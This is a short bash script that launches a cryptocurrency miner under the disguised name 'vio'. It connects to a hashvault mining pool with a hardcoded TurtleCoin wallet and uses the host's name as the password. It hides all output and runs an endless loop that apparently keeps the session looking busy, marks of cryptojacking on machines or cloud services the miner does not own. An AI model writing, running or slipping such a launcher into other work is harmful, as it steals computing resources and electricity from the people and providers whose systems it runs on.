#!/bin/bash
chmod u+x vio
./vio --pool pool.hashvault.pro:80 --username TRTLuyhTSuu5cKEs7mgBwVXEAvh4uJyUNfG6CskYPw998yHNL6UrraV2XoBTtkjL4NRh7Uo9qyN6qBQePU2gAa7vdL9MsCFCULN --password $(cat /proc/sys/kernel/hostname) --algorithm chukwa_v2 --ssl >/dev/null &
while :; do shuf -n 1 -i 1-99999999; sleep 30; done >/dev/null >/dev/null 2>&1
